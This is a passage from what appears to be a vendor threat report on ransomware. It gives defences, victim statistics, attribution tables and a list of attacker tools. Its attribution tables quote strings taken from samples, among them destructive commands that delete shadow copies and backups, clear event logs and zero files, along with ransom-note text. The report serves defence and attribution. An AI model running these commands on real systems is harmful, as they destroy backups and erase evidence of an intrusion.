assets\n\n### • [Understand and become familiar with your network: how ]\ndoes the data flow, what is the access matrix, etc.\n\n### • [Honeypots Usage]\n\n • [Consider the use of a production honeypot in your ]\norganisation.\n\n## Countering Data Loss\n\nTo reduce the impact of a ransomware attack, implement a backup\npolicy for your organisation. There are several principles that can help\nyou improve effectiveness:\n\n### • [Offsite Storage]\nUsing offsite storage provides you with additional safety. It can be the\npoint of recovery if your organisation is compromised.\n\n### • [3-2-1 Rule]\nKeep three copies of the data on two different types of media with at\nleast one off-site storage solution.\n\n### • [Regularity]\nThere are some criteria that can help you plan:\n\n### • [the criticality of the system and data]\n • [the likelihood of needing the data in an emergency]\n • [Time needed to recover the system and data in an ]\nemergency\n\n### • [the cost of backup]\n • [Encryption]\nConsider keeping your backups encrypted. This increases the\nstrictness of confidentiality.\n\n\n-----\n\n## Preparing for an Incident\n\n### • [Asset management]\nConsider implementing asset management in order to identify:\n\na. What are your critical assets\nb. How are they configured\nc. Where is your critical data in your environment\n\nConsider developing a plan for restoring backups. You should know the\napproximate time this process takes.\n\nThis will help you to determine the impact to your organisation if you\nwere affected by a ransomware attack.\n\n### • [Communication strategy]\nDevelop an internal and external communication strategy. TableTop\nexercises can help a lot with that. It is important that the right\ninformation reaches the right stakeholders in a timely manner.\n\n### • [Response planning]\nDetermine how you will respond to a ransom demand and the threat of\npublication of your organisation’s data.\n\nIf you do not have an internal incident response team, we suggest\nsubscribing to an external IR service.\n\nKaspersky Global Emergency Response Team(GERT) can help you\nwith that.\n\n### • [Important guidelines]\nEnsure that incident management books and supporting resources,\nsuch as checklists and contact details, are available if you do not have\naccess to computer systems.\n\n### • [Interaction with regulators]\nDefine your legal obligations with regard to reporting incidents to\nregulators and understand how to approach this.\n\n### • [Script Design]\nImplement your incident management plan. This will help clarify the\nroles and responsibilities of employees and third parties, and prioritise\nsystem recovery.\n\n### • [Lessons Learned]\nAfter an incident, review your incident management plan,\nincorporating lessons learned to ensure that a similar event does not\nhappen again.\n\n\n-----\n\n|Col1|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|\n\n\n## Victims\n\nNow that we have looked at the technical details and mitigation\nstrategies, we have an understanding of what exactly ransomware\ntools do and how to combat them. Let us take a look at the victims\nof ransomware attacks and try to understand why the attacks were\nsuccessful.\n\nFor this analysis, we used statistical sources on detections,\nand sources of darknet announcements on victims as posted\nby ransomware operators. The number of victims affected by\nransomware is anything but low. As can be seen from the graph\nbelow, last year’s exceed 100 in most cases, hovering around 400 in\nsome months.\n\n400\n\n350\n\n300\n\n250\n\n200\n\n150\n\n100\n\n50\n\n0\n\nMarch April May June July August September October November December January February March\n2021 2021 2021 2021 2021 2021 2021 2021 2021 2021 2022 2022 2022\n\nFig. 37 — Number of victims per year\n\nThis data can be obtained by downloading posts from darknet sites\nowned by ransomware operators or sites publishing related news.\nA list of .onion links to ransomware operators’ sites is provided in\nAppendix II.\n\nLet us take a closer look at the victims of popular ransomware tools.\n\n\n-----\n\n|Ransom family Top location|Count of victim organisations per location|Count of victim organisations|\n|---|---|---|\n|United States Conti Great Britain Germany France Canada|237 38 31 26 24|484|\n|United States Pysa Great Britain Austria Germany Canada|67 14 9 5 4|149|\n|United States Clop (new) Canada Italy Austria Germany|54 6 6 6 5|114|\n|United States Hive China Germany Australia Belgium Netherlands|28 3 3 2 2 2|50|\n|France Everest United States Canada Austria Italy|14 13 9 7 4|63|\n|United States Ragnarlocker India France Slovakia Spain|13 4 2 2 2|28|\n|United States Lockbit2.0 Italy Great Britain Mexico Brazil|7 7 3 2 2|31|\n|United States BlackCat Italy Austria Hong Kong Switzerland|5 3 3 1 1|28|\n|United States Vicesociety Germany New Zealand Netherlands Canada|11 2 1 1 1|20|\n|United States BlackByte Germany Russia Netherlands Mexico|11 3 1 1 1|27|\n\n\nCount of victim\n\nCount of victim\n\nRansom family Top location organisations per\n\norganisations\n\nlocation\n\nUnited States 237\nConti\nGreat Britain 38\nGermany 31 484\nFrance 26\nCanada 24\n\nUnited States 67\nPysa\nGreat Britain 14\nAustria 9 149\nGermany 5\nCanada 4\n\nUnited States 54\nClop (new)\nCanada 6\nItaly 6 114\nAustria 6\nGermany 5\n\nUnited States 28\nHive\nChina 3\nGermany 3\n\n50\n\nAustralia 2\nBelgium 2\nNetherlands 2\n\nFrance 14\nEverest\nUnited States 13\nCanada 9 63\nAustria 7\nItaly 4\n\nUnited States 13\nRagnarlocker\nIndia 4\nFrance 2 28\nSlovakia 2\nSpain 2\n\nUnited States 7\nLockbit2.0\nItaly 7\nGreat Britain 3 31\nMexico 2\nBrazil 2\n\nUnited States 5\nBlackCat\nItaly 3\nAustria 3 28\nHong Kong 1\nSwitzerland 1\n\nUnited States 11\nVicesociety\nGermany 2\nNew Zealand 1 20\nNetherlands 1\nCanada 1\n\nUnited States 11\nBlackByte\nGermany 3\nRussia 1 27\nNetherlands 1\nMexico 1\n\n\n-----\n\n|Ransom family TOP Industry|Count of victim organisations|\n|---|---|\n|Manufacturer Conti/Ryuk Construction Software development Legal Insurance|45 19 16 6 6|\n|Education Pysa Manufacturer|18 3|\n|Software development Clop (TA505) Legal Manufacturer Education Consulting|9 8 5 4 3|\n|Small business Hive Hospital Legal Real estate Transport|14 7 5 4 4|\n|Manufacturer Ragnarlocker Software development Legal Pharmaceutical Aircraft building|3 3 2 2 2|\n|Small business Lockbit2.0 Legal|12 2|\n|Small business BlackCat Manufacturer Consulting|6 3 2|\n|small business BlackByte Construction Consulting|5 2 2|\n\n\nRansom family TOP Industry Count of victim organisations\n\nManufacturer 45\nConti/Ryuk\nConstruction 19\nSoftware development 16\nLegal 6\nInsurance 6\n\nEducation 18\nPysa\nManufacturer 3\n\nSoftware development 9\nClop (TA505)\nLegal 8\nManufacturer 5\nEducation 4\nConsulting 3\n\nSmall business 14\nHive\nHospital 7\nLegal 5\nReal estate 4\nTransport 4\n\nManufacturer 3\nRagnarlocker\nSoftware development 3\nLegal 2\nPharmaceutical 2\nAircraft building 2\n\nSmall business 12\nLockbit2.0\nLegal 2\n\nSmall business 6\nBlackCat\nManufacturer 3\nConsulting 2\n\nsmall business 5\nBlackByte\nConstruction 2\nConsulting 2\n\nThe following conclusions can be drawn from the statistical data\npresented above.\n\n1. Operators target countries with a large number of companies\ncapable of paying ransoms.\n\n2. They tend to aim at larger companies, but they keep in mind\nsmall and medium-sized businesses, as these often lack advanced\nprotection, which makes them more vulnerable to the penetration\nmethods described above.\n\n3. The most popular ransomware tools, e.g., Conti, Pysa or Clop, may\nhit more than a hundred victims per year. This further confirms that\ngeneric techniques and methods can be applied to most companies in\nthe world, since each attack is not that much different from the last\none, or not different at all.\n\n\n-----\n\n## Attribution\n\nThe relationship with other actors is based on TTPs, using the same\ninstruments and sample attribution using genotypes and strings. An\nattack can be attributed to a family by identifying a shared component\nthrough the analysis of technical details and malicious files.\n\n## Strings and Genotypes\n\nAttribution using Kaspersky Threat Attribution Engine with strings\nand genotypes. You can read about technology here https://www.\n**kaspersky.com/enterprise-security/cyber-attack-attribution-**\n**tool. This is an example of an attribution report on one of the**\nransomware samples.\n\nFig. 38 — Threat Attribution in KTAE\n\nSample analysis of each family shows a more than 90% match with the\nknown samples as well as a small percentage of similarity with other\nfamilies. Next, let’s understand the received attribution data.\n\n\n-----\n\n|Family Tested samples|Samples attributed to actors|Extracted strings|\n|---|---|---|\n|7bc825350bb50df272ba- Blackbyte f877acc5fe81 73ce65da1d98b- 2832c6f5d798b10f84c fabdad9c5e68f091ac532b- dc6a4afdee 0b229a1acbd8a78541b3f- 7d466e73687 07a9b1fdfb383a2b- 1d0172802ce01033 And others|SilentBreak_CA(12%) Hive Ransomware Linux(6%) DeadBolt_Ransomware(4%) Hive Ransomware(1%) TellYouThePass_ Ransomware(1%) - Matches between file samples are mainly found in function prologues or a Golang runtime package. There is no code shared between families.|runtime.osyield_no_g unlock: lock countsigsend: inconsistent statestack size not a power of 2startm: negative nmspinningstopTheWorld: holding lockstime gosave_systemstack_ switch file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ|\n|60e43a7246f5ce09cd- Blackcat 9068c382603d12 aea5d3cced- 6725f37e2c3797735e6467 d5857586faf2ce0232331d- c176afd7e8 8e1f22dd9e809ead5e19b- 340b0c80cae 173c4085c23080d9fb- 19280cc507d28d f5f 6e700d15f3d- 944424c295eae926d9 79fea7f741760ea21f- f655137af05bd0 And others|BlackCat ransomware Windows(80%-100%) BlackCat ransomware Linux(3-7%)|locker::core::windows::pro- cessvssadmin.exe delete shadows /all /quietshad- ow_copy::remove_all= pathslog-fileno-vm-kill- no-propno-net- no-prop-serversprop- agatedchildverboseui- ACCESS_TOKENAccess TokenPATHSOnly proc locker::core::windows::psex- ecsrc/core/windows/psex- ec.rs -accepteula X encrypt_app::windowssrc/ bin/encrypt_app/windows. rsTrying to self propagate to reg add HKEY_LOCAL_MA- CHINE\\SYSTEM\\Current- ControlSet\\Services\\Lan- manServer\\Parameters /v MaxMpxCt /d 65535 /t RE src/core/windows/netbios. rs|\n|d6b4bfba0cd0d79c- Cl0p (new) f741150a9cf2ee5d 5e892158e67404ac10f- 90477ce0782cb 6499986392fb80f8dd488f9 5473ec55c And others|Cl0p (100%)|ClopReadMe.txt cSecurityCenterIBM SecurityCenterIBM|\n\n\nSamples attributed to\nFamily Tested samples Extracted strings\nactors\n\n7bc825350bb50df272ba- SilentBreak_CA(12%) runtime.osyield_no_g\nBlackbyte\nf877acc5fe81 Hive Ransomware Linux(6%)\n\nunlock: lock countsigsend:\n\n73ce65da1d98b- DeadBolt_Ransomware(4%)\n\ninconsistent statestack\n\n2832c6f5d798b10f84c Hive Ransomware(1%)\n\nsize not a power of\n\nfabdad9c5e68f091ac532b- TellYouThePass_\n\n2startm: negative\n\ndc6a4afdee Ransomware(1%)\n\nnmspinningstopTheWorld:\n\n0b229a1acbd8a78541b3f-\n\n                                  - Matches between file holding lockstime\n\n7d466e73687\n\nsamples are mainly found\n\n07a9b1fdfb383a2b- gosave_systemstack_\n\nin function prologues or a\n\n1d0172802ce01033 switch\n\nGolang runtime package.\n\nAnd others\n\nThere is no code shared file descriptor in bad\nbetween families. statefindrunnable: netpoll\n\nwith pfound pointer to free\nobjectgcBgMarkWorker:\nmode not setgcstopm:\nnegativ\n\n60e43a7246f5ce09cd- BlackCat ransomware locker::core::windows::pro-\nBlackcat\n9068c382603d12 Windows(80%-100%) cessvssadmin.exe delete\naea5d3cced- BlackCat ransomware shadows /all /quietshad-\n6725f37e2c3797735e6467 Linux(3-7%) ow_copy::remove_all=\nd5857586faf2ce0232331d-\n\npathslog-fileno-vm-kill-\n\nc176afd7e8\n\nno-propno-net-\n\n8e1f22dd9e809ead5e19b-\n\nno-prop-serversprop-\n\n340b0c80cae\n\nagatedchildverboseui-\n\n173c4085c23080d9fb-\n\nACCESS_TOKENAccess\n\n19280cc507d28d\n\nTokenPATHSOnly proc\n\nff56e700d15f3d-\n944424c295eae926d9 locker::core::windows::psex-\n79fea7f741760ea21f- ecsrc/core/windows/psex-\nf655137af05bd0 ec.rs -accepteula X\nAnd others\n\nencrypt_app::windowssrc/\nbin/encrypt_app/windows.\nrsTrying to self propagate\nto\n\nreg add HKEY_LOCAL_MA-\nCHINE\\SYSTEM\\Current-\nControlSet\\Services\\Lan-\nmanServer\\Parameters /v\nMaxMpxCt /d 65535 /t RE\n\nsrc/core/windows/netbios.\nrs\n\nd6b4bfba0cd0d79c- Cl0p (100%)\nCl0p (new)\nf741150a9cf2ee5d\n\nClopReadMe.txt\n\n5e892158e67404ac10f-\n90477ce0782cb cSecurityCenterIBM\n6499986392fb80f8dd488f9\n\nSecurityCenterIBM\n\n5473ec55c\nAnd others\n\n\n-----\n\n|Family Tested samples|Samples attributed to actors|Extracted strings|\n|---|---|---|\n|6da5a1163c- Conti 3c8264134b3366521ef78a|Conti (100%), Bazar (1%), Conti Linux (1%)|http://m232fdxbfmbrceh- brj5iayknxnggf6niqfj6x4ie- drgtab4qupzjlaid.onion YOU SHOULD BE AWARE! (you should download and install TOR browser first https://torproject.org) A:\\source\\conti_v3\\Re- lease\\cryptor.pdb https://contirecovery.info As you know (if you don’t - just “google it”), all of the data that has been encrypted by our software cannot be All of your files are currently encrypted by CONTI strain. To make sure that we REALLY CAN get your data back - we ofef r you to decrypt 2 random files completely free|\n|0cd029a800740242acd6 Conti 1851bfca6389|RaccoonStealer (8%), Smoke Loader (8%), RedLine(7%), DanaBot (7%), CryptBot (6%) - Malware packers matches|ProductVersus FileVersus|\n|796a92acbede- Conti 4231a24b5f6100393423 And others|Conti (100%)||\n|c72177d- Doppelpaymer 54f200389e1e6307897292c 23 cb9c05ef3c08ed- 4810c2bb9599861b81 And others|DoppelPaymer (100%)|IrwhEbzeh.exe F:\\ACTUALLIST\\ LOGINFIRST!!!\\@ RTGWEHW.exe|\n|4cecba74a070e41e186e62 Everest bddf7bb985 4d9398314dbd639af2645d6 2c78714a5 93e1b45fc2e9e645d440cf dcc7e12f92 4038c4ddc39fe74843065 a44b961e04b And others|Everest (100%)||\n|6c1444d0e1c63881918fdd4d Hive 60d54f9d|Hive Ransomware (100%), SilentBreak_CA (12%), Hive Ransomware Linux (1%), DeadBolt_Ransomware (1%), TellYouThePass_ Ransomware (1%)|- Matches between file samples are mainly found in function prologues or a Golang runtime package. There is no code shared between families.|\n\n\nSamples attributed to\nFamily Tested samples Extracted strings\nactors\n\n6da5a1163c- Conti (100%), Bazar (1%), http://m232fdxbfmbrceh-\nConti\n3c8264134b3366521ef78a Conti Linux (1%) brj5iayknxnggf6niqfj6x4ie-\ndrgtab4qupzjlaid.onion\n\nYOU SHOULD BE AWARE!\n\n(you should download and\ninstall TOR browser first\nhttps://torproject.org)\n\nA:\\source\\conti_v3\\Re-\nlease\\cryptor.pdb\n\nhttps://contirecovery.info\n\nAs you know (if you don’t\n\n                                                              - just “google it”), all of\nthe data that has been\nencrypted by our software\ncannot be\n\nAll of your files are currently\nencrypted by CONTI strain.\n\nTo make sure that we\nREALLY CAN get your\ndata back - we offer you\nto decrypt 2 random files\ncompletely free\n\n0cd029a800740242acd6 RaccoonStealer (8%),\nConti\n1851bfca6389 Smoke Loader (8%), ProductVersus\nRedLine(7%), DanaBot (7%), FileVersus\nCryptBot (6%)\n\n                                - Malware packers matches\n\n796a92acbede- Conti (100%)\nConti\n4231a24b5f6100393423\nAnd others\n\nDoppelpaymer c72177d- **DoppelPaymer (100%)** IrwhEbzeh.exe\n54f200389e1e6307897292c\n\nF:\\ACTUALLIST\\\n\n23 cb9c05ef3c08ed-\n\nLOGINFIRST!!!\\@\n\n4810c2bb9599861b81\n\nRTGWEHW.exe\n\nAnd others\n\n4cecba74a070e41e186e62 Everest (100%)\nEverest\nbddf7bb985\n4d9398314dbd639af2645d6\n2c78714a5\n93e1b45fc2e9e645d440cf\ndcc7e12f92\n4038c4ddc39fe74843065\na44b961e04b\nAnd others\n\n6c1444d0e1c63881918fdd4d Hive Ransomware (100%),                 - Matches between file\nHive\n60d54f9d SilentBreak_CA (12%), Hive samples are mainly found\nRansomware Linux (1%), in function prologues or a\nDeadBolt_Ransomware Golang runtime package.\n(1%), TellYouThePass_ There is no code shared\nRansomware (1%) between families.\n\n\n-----\n\n|Family Tested samples|Samples attributed to actors|Extracted strings|\n|---|---|---|\n|4e24407defdf 0a8b899961 Hive ea1c9222b8 4b0fc56cce5167743ce650 ddac0f51b2 7e3d8f824334f1d6d122249 ab9cc4eb7 0ab91e5ef3adaca38f342 d3f08263741|Hive Ransomware (10-36%), SilentBreak_CA (5-12%), Hive Ransomware Linux (1%), DeadBolt_Ransomware (1%), TellYouThePass_ Ransomware (1%)|- Matches between file samples are mainly found in function prologues or a Golang runtime package. There is no code shared between families.|\n|aa054989688fede5afdb- Lockbit 1ce6c3e95ce3 2ec6e2453b902eaf- f62a936e26338445|Lockbit (100%), Lockbit 2.0 (98%), Stealbit (1%)|\\Registry\\Machine\\Soft- ware\\Classes\\Lockbit\\ shell\\Open \\Registry\\Machine\\Soft- ware\\Classes\\Lockbit /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData ofsf et=0 length=52428 LockBit Class https://bigblog.at LockBit_2_0_Ransom \\Registry\\Machine\\Soft- ware\\Classes\\.lockbit\\ DefaultIcon \\BaseNamedObjects\\ {%02X%02X%02X- %02X-%02X%02X-%02X- %02X-%02 <Exec><Command>%s</ Command><Argu- ments>%s</Arguments> cmd.exe /c “shutdown.exe /r /f /t 0” LDAP://CN=%s,CN=Poli- cies,CN=System,DC [Software\\Policies\\Micro- soft\\Windows Defender\\ Real-Time Protection|\n\n\nSamples attributed to\nFamily Tested samples Extracted strings\nactors\n\n4e24407deffd0a8b899961 Hive Ransomware (10-36%),\nHive\nea1c9222b8 SilentBreak_CA (5-12%),                  - Matches between file\n4b0fc56cce5167743ce650 Hive Ransomware Linux (1%), samples are mainly found\nddac0f51b2 DeadBolt_Ransomware in function prologues or a\n7e3d8f824334f1d6d122249 (1%), TellYouThePass_ Golang runtime package.\nab9cc4eb7 Ransomware (1%) There is no code shared\n0ab91e5ef3adaca38f342 between families.\nd3f08263741\n\naa054989688fede5afdb- Lockbit (100%), Lockbit 2.0 \\Registry\\Machine\\Soft-\nLockbit\n1ce6c3e95ce3 (98%), Stealbit (1%) ware\\Classes\\Lockbit\\\n2ec6e2453b902eaf- shell\\Open\nf62a936e26338445\n\n\\Registry\\Machine\\Soft-\nware\\Classes\\Lockbit\n\n/C ping 127.0.0.7 -n 3 > Nul\n& fsutil file setZeroData\noffset=0 length=52428\n\nLockBit Class\n\nhttps://bigblog.at\n\nLockBit_2_0_Ransom\n\n\\Registry\\Machine\\Soft-\nware\\Classes\\.lockbit\\\nDefaultIcon\n\n\\BaseNamedObjects\\\n{%02X%02X%02X-\n%02X-%02X%02X-%02X-\n%02X-%02\n\n<Exec><Command>%s</\nCommand><Argu-\nments>%s</Arguments>\n\ncmd.exe /c “shutdown.exe\n/r /f /t 0”\n\nLDAP://CN=%s,CN=Poli-\ncies,CN=System,DC\n\n[Software\\Policies\\Micro-\nsoft\\Windows Defender\\\nReal-Time Protection\n\n\n-----\n\n|1024a8b9aed885c- Lockbit 0117476c87cc5bc08|Lockbit (100%) Babuk_Locker (31%), Ryuk (9%), RansomEXX (6%), Diavol ransomware (5%) - Matches between file samples are mainly found due to activities inherent to any ransomware, such as deleting shadow copies (accessing the vssadmin utility)|vmware-usbarbitator64 MSSQLFDLauncher$SB- SMONITORING mydesktopqos \\Restore-My-Files.txt SOFTWARE\\LockBit # Do not rename encrypted files. /c bcdedit /set {default} bootstatuspolicy ignoreall- failures /c wevtutil cl security Local time: %d.%d %d:%d Killed process: %s [pid: %ld] /c wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest /c wbadmin DELETE SYS- TEMSTATEBACKUP Volume Shadow Copy & Event log clean /c wevtutil cl system SQLAgent$KAV_CS_AD- MIN_KIT Global\\{02B49784- 1CA2-436C-BC08- 72FA3956507D} /c vssadmin delete shad- ows /all /quiet & wmic shadowcopy delete & bcdedit /set {d %ld files encrypted; speed %ld files/sec Unable to bind NOTE file IOCP %S error: %d y /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData ofsf et=0 length=524288 “%s Open link http://lockbit-de- cryptor.top/?|\n|---|---|---|\n\n\nSamples attributed to\nFamily Tested samples Extracted strings\nactors\n\n1024a8b9aed885c- Lockbit (100%) vmware-usbarbitator64\nLockbit\n0117476c87cc5bc08\n\nBabuk_Locker (31%), Ryuk MSSQLFDLauncher$SB-\n(9%), RansomEXX (6%), SMONITORING\nDiavol ransomware (5%)\n\nmydesktopqos\n\n                                  - Matches between file\n\n\\Restore-My-Files.txt\n\nsamples are mainly found\ndue to activities inherent SOFTWARE\\LockBit\nto any ransomware, such\n\n# Do not rename encrypted\n\nas deleting shadow copies\n\nfiles.\n\n(accessing the vssadmin\nutility) /c bcdedit /set {default}\n\nbootstatuspolicy ignoreall-\nfailures\n\n/c wevtutil cl security\n\nLocal time: %d.%d %d:%d\n\nKilled process: %s [pid: %ld]\n\n/c wbadmin DELETE\nSYSTEMSTATEBACKUP\n-deleteOldest\n\n/c wbadmin DELETE SYS-\nTEMSTATEBACKUP\n\nVolume Shadow Copy &\nEvent log clean\n\n/c wevtutil cl system\n\nSQLAgent$KAV_CS_AD-\nMIN_KIT\n\nGlobal\\{02B49784-\n1CA2-436C-BC08-\n72FA3956507D}\n\n/c vssadmin delete shad-\nows /all /quiet & wmic\nshadowcopy delete &\nbcdedit /set {d\n\n%ld files encrypted; speed\n%ld files/sec\n\nUnable to bind NOTE file\nIOCP %S error: %d\n\ny /C ping 127.0.0.7 -n 3 > Nul\n& fsutil file setZeroData\noffset=0 length=524288 “%s\n\nOpen link http://lockbit-de-\ncryptor.top/?\n\n\n-----\n\n|Family Tested samples|Samples attributed to actors|Extracted strings|\n|---|---|---|\n|c5c4fea534279ee- Lockbit 19af84d8000b58f5d 1024a8b9aed885c- 0117476c87cc5bc08|Lockbit (99%) Babuk_Locker (31%), Ryuk (9%), RansomEXX (5%), Diavol ransomware (4%) - Matches between file samples are mainly found due to activities inherent to any ransomware, such as deleting shadow copies (accessing the vssadmin utility)|/c vssadmin Delete Shad- ows /All /Quiet %S %s total / %s free /c vssadmin delete shad- ows /all /quiet & wmic shadowcopy AES-NI support enabled LockBit Ransom %s\\LockBit-note.hta y /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData ofsf et=0 length=524288 “%s” & Del /f /q “%s” | 1. Open link http://lock- bit-decryptor.top/? vmware-usbarbitator64|\n|6a58c982b5ab1b72e- Pysa 5445281983550da 43cb02d6987ae179c69a7d- d8c45fe675 69d384bd- 9411100d26644eb- c8b053419 0e20d8b10b555b3bc2711b- b878a02cab c2db443f65be83529957f-f baeda48402|Mespinoza_ransonware (65%) = Pysa|%s\\Readme.README Every byte on any types of your devices was encrypt- ed. A: You can send us 2 files(- max 2mb). Hi Company, A: Protect Your System Amigo.|\n|fe51255c009bbc- Ryuk 4f74186e7a5db0f81b fca7c92f41e13861b4e6f- 60405c714eb 0a9f8f 3b67a2bc19ae7b3f- 4b154ea6d8|Cring(71%), Ryuk (49%), Lazars (30%), BlueNoroff(29%), HermesRansom (5%) - Matches between file samples are mainly found due to activities inherent to any ransomware. There is no code shared between Ryuk, Cring, HermesRansom|del /s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win cies\\System\\ vssadmin resize shadow- storage /for=e: /on=e: / maxsize=401MB vssadmin Delete Shadows / all /quiet \\users\\Public\\finish|\n|6d122b4bfab5e75f3ae- RagnarLocker 903805cbbc641|Ragnar Locker (100%), Cl0p (1%)||\n\n\nSamples attributed to\nFamily Tested samples Extracted strings\nactors\n\nc5c4fea534279ee- Lockbit (99%) /c vssadmin Delete Shad-\nLockbit\n19af84d8000b58f5d ows /All /Quiet\n\nBabuk_Locker (31%), Ryuk\n\n1024a8b9aed885c-\n\n(9%), RansomEXX (5%), %S %s total / %s free\n\n0117476c87cc5bc08\n\nDiavol ransomware (4%)\n\n/c vssadmin delete shad-\n\n                                  - Matches between file ows /all /quiet & wmic\nsamples are mainly found shadowcopy\ndue to activities inherent\n\nAES-NI support enabled\n\nto any ransomware, such\nas deleting shadow copies LockBit Ransom\n(accessing the vssadmin\n\n%s\\LockBit-note.hta\n\nutility)\n\ny /C ping 127.0.0.7 -n 3 > Nul\n& fsutil file setZeroData\noffset=0 length=524288\n“%s” & Del /f /q “%s”\n\n| 1. Open link http://lock-\nbit-decryptor.top/?\n\nvmware-usbarbitator64\n\n6a58c982b5ab1b72e- Mespinoza_ransonware %s\\Readme.README\nPysa\n5445281983550da (65%) = Pysa\n\nEvery byte on any types of\n\n43cb02d6987ae179c69a7d-\n\nyour devices was encrypt-\n\nd8c45fe675\n\ned.\n\n69d384bd-\n9411100d26644eb- A: You can send us 2 files(-\nc8b053419 max 2mb).\n0e20d8b10b555b3bc2711b-\n\nHi Company,\n\nb878a02cab\nc2db443f65be83529957ff- A: Protect Your System\nbaeda48402 Amigo.\n\nfe51255c009bbc- Cring(71%), Ryuk del /s /f /q h:\\*.VHD h:\\*.bac\nRyuk\n4f74186e7a5db0f81b (49%), Lazars (30%), h:\\*.bak h:\\*.wbcat h:\\*.bkf\nfca7c92f41e13861b4e6f- BlueNoroff(29%), h:\\Backup*.* h:\\backup*.*\n60405c714eb HermesRansom (5%) h:\\*.set h:\\*.win\n0a9ff83b67a2bc19ae7b3f-\n\n                                  - Matches between file cies\\System\\\n\n4b154ea6d8\n\nsamples are mainly found\n\nvssadmin resize shadow-\n\ndue to activities inherent\n\nstorage /for=e: /on=e: /\n\nto any ransomware. There\n\nmaxsize=401MB\n\nis no code shared between\nRyuk, Cring, HermesRansom vssadmin Delete Shadows /\n\nall /quiet\n\n\\users\\Public\\finish\n\n6d122b4bfab5e75f3ae- Ragnar Locker (100%), Cl0p\nRagnarLocker\n903805cbbc641 (1%)\n\nThe data presented above makes it clear that, unlike techniques, string\nand genotype relations between ransomware families cannot be used\nfor attribution purposes. Matches between file samples are mainly\nfound due to activities inherent in any ransomware, such as deleting\nshadow copies (accessing the vssadmin utility) or sequentially reading a\nlarge number of files, or due to snippets of code shared by all programs,\nsuch as function prologues or a Golang runtime package, with the match\npercentage being low. Technical analysis, or tools like KTAE, can help\ndetermine to which family or actor a file belongs. The IoCs provided in\n\n\n-----\n\n## Tools and Utilities\n\nWe used the results of our attack analysis to compile a list of wellknown utilities used by ransomware operators.\n\n|Actors|Tools|\n|---|---|\n|PsExec, RedLine Stealer, CobaltStrike, NBMiner, dxdiag, Advanced IP Scanner, PCHunter, Hive GMER, Bloodhound||\n|Clop FlawedAmmyy RAT, CobaltStrike, TinyMet, SDBOT, DEWMODE, Get2 Loader||\n|Lockbit Mimikatz, PsExec, Koadic, Empire, LaZagne||\n|RagnarLocker CobaltStrike||\n|Conti QBot, IcedID, CobaltStrike||\n|Pysa Gasket, PsExec, PowerShell Empire, MagicSocks||\n|CobaltStrike, Mimikatz, AnyDesk, SoftPerfect Network Scanner, Process Explorer, Blackbyte PowerView||\n|BlackCat PsExec, CobaltStrike, Mimikatz, WebBrowserPassView, Koadic, Empire, LaZagne||\n\n\nPsExec, RedLine Stealer, CobaltStrike, NBMiner, dxdiag, Advanced IP Scanner, PCHunter,\nHive\nGMER, Bloodhound\n\nClop FlawedAmmyy RAT, CobaltStrike, TinyMet, SDBOT, DEWMODE, Get2 Loader\n\nLockbit Mimikatz, PsExec, Koadic, Empire, LaZagne\n\nRagnarLocker CobaltStrike\n\nConti QBot, IcedID, CobaltStrike\n\nPysa Gasket, PsExec, PowerShell Empire, MagicSocks\n\nCobaltStrike, Mimikatz, AnyDesk, SoftPerfect Network Scanner, Process Explorer,\nBlackbyte\nPowerView\n\nBlackCat PsExec, CobaltStrike, Mimikatz, WebBrowserPassView, Koadic, Empire, LaZagne\n\n\n-----\n\n## Conclusions\n\nAs can be seen from the analysis presented above, the schemes by\nwhich the attackers plan their actions are very similar to each other.\nThe ways in which attackers achieve their goals lend themselves to\nsystematisation and the creation of generic rules to prevent such\nattacks. The methodology MITRE ATT&CK allows you to quickly and\naccurately attribute detected security events to the techniques and\ntactics presented.\n\n##### Where does the similarity between attacks come from\n\nTo summarise why the attacks are similar to each other, we can\nhighlight several main points:\n\n#### a b\n\n**The emergence of the phenomenon as** **The reusing of old and similar tools makes life**\n**Ransomware-as-a-Service (RaaS), when the** **easier for attackers and reduces the time it**\n**operators themselves do not deliver malware, but** **takes to prepare for an attack.**\n**only provide the data encryption services. Since**\n**those people who deliver malicious files also want**\n**to simplify their lives, they use template delivery**\n**methods or automation tools to gain access.**\n\n#### c d e\n\n**Reusing common TTPs makes** **An attack on a large number** **Slow installation of updates**\n**hacking easier. Although it** **of companies. Due to the low** **and patches among victims.**\n**is possible to detect such** **cost of preparing an attack** **It often happens that those**\n**techniques, it usually cannot** **per victim, there can be many** **who are vulnerable to a known**\n**be done preventively on all** **victims, which will ultimately** **vulnerability are attacked.**\n**possible threat vectors.** **prove statistically profitable**\n\n**for ransomware attackers**\n\n##### Final observations\n\nIf you use our report as a guideline to build protection against\nransomware attacks, you can improve your organisation’s protection\nnot only against a particular family, but against most families at once,\nas well as speed up incident response, since all identified techniques\nand progressions through attack stages (according to KillChain) are\nsimilar. All proposed defence mechanisms are already presented\nin the report, including SIGMA rules that are ready to be applied to\ninfrastructure and security rules to mitigate similar incidents.\n\nThe schema created in the analysis can be used to build a threat model\nand test the existing solutions against this model.\n\n\n-----\n\n|Appendix I|– Sigma Rules|\n|---|---|\n|Techniques|SIGMA|\n|Exploit Public-Facing • Windows Shell Start by Web Applications Application T1190||\n|• Started windows shell from Trusted process User Execution T1204 • Drop Execution File From by Trusted Process||\n|Available in the full version of the report in Kaspersky TIP: Command and Scripting Interpreter T1059 • Execution of Downloaded Powershell Code • Encoded/decoded PowerShell Сode Execution • Executing PS1 from Public Directory • Powershell Suspicious Arguments • Executing JavaScript from Public Directories||\n|Available in the full version of the report in Kaspersky TIP: Windows Management Instrumentation T1047 • Suspicious Command wmic.exe • Suspicious Child Process Wmiprvse.exe||\n|Scheduled Task/Job: • Scheduled Task Start from Public Directory Scheduled Task T1053.005 • Windows Shell Started Schtasks||\n|Available in the full version of the report in Kaspersky TIP: Boot or Logon Autostart Execution: Registry Run Keys • Modification Main Registry Run Keys / Startup Folder T1547.001 • Adding Path of Open Folder in Run Keys via Registry • Adding Suspicious File in Autorun Keys via Registry • Suspicious File Creation in Startup 